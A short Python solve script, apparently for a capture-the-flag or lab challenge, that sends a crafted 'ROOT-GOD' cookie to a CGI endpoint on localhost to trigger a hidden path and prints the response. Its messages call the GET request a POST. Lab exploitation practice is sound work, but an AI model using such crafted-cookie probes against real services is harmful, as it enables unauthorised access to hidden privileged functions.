#coding:utf-8
from pwn import *
import requests

def pwn1():
    cookies = {
    'ROOT-GOD': "Every king's blood will end with a sword",
    }
    url='http://127.0.0.1:10086/getcookie.cgi'
    r=requests.get(url=url,cookies=cookies)
    print(r.text)
    if r.status_code == 200:
        print('POST请求成功！')
        print('响应内容：', r.text)
    else:
        print('POST请求失败。状态码：', r.status_code)

pwn1()
